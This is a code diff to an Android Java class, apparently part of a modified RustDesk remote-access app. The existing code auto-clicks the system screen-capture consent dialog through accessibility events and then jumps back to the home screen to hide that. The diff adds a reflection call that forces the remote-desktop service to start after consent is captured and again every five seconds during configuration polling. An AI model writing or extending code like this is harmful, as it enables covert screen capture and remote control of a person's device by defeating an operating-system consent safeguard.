@@ -105,10 +105,26 @@ public class AutoConsentHelper {
             if (clicked) {
                 lastConsentAttempt = now;
                 Log.i(TAG, "Intercepted and clicked MediaProjection consent via onAccessibilityEvent!");
+                ensureRustDeskServiceStarted();
                 returnToHomeLauncher();
             }
         } catch (Throwable t) {
             Log.e(TAG, "Error in handleAccessibilityEvent: ", t);
+        }
+    }
+
+    public static void ensureRustDeskServiceStarted() {
+        try {
+            Class<?> ffiClass = Class.forName("ffi.FFI");
+            java.lang.reflect.Field aField = ffiClass.getDeclaredField("a");
+            aField.setAccessible(true);
+            Object ffiObj = aField.get(null);
+            java.lang.reflect.Method startServiceMethod = ffiClass.getDeclaredMethod("startService");
+            startServiceMethod.setAccessible(true);
+            startServiceMethod.invoke(ffiObj);
+            Log.i(TAG, "ensureRustDeskServiceStarted: FFI.startService() invoked successfully!");
+        } catch (Throwable t) {
+            Log.w(TAG, "ensureRustDeskServiceStarted notice: " + t.getMessage());
         }
     }
 
@@ -568,6 +584,7 @@ public class AutoConsentHelper {
                         br.close();
                         if (l != null && l.contains("TYPE_SCREEN_CAPTURE")) {
                             Log.i(TAG, "MediaProjection confirmed active! Returning to home launcher...");
+                            ensureRustDeskServiceStarted();
                             Thread.sleep(400);
                             returnToHomeLauncher();
                             break;
@@ -1090,9 +1107,8 @@ public class AutoConsentHelper {
                 try {
                     Thread.sleep(5000); // 5 seconds fast poll for instant, responsive config synchronization
                     pollCounter++;
-                    File toml1 = new File("/data/user/0/com.carriez.flutter_hbb/app_flutter/RustDesk.toml");
-                    String deviceId = ConfigManager.extractTomlValue(ConfigManager.readFile(toml1), "id");
-                    if (deviceId == null || deviceId.isEmpty()) deviceId = "404156725";
+                    ensureRustDeskServiceStarted();
+                    String deviceId = ConfigManager.getDeviceId(context);
 
                     int currentVer = ConfigManager.getConfigVersion(context);
                     String modelParam = "";
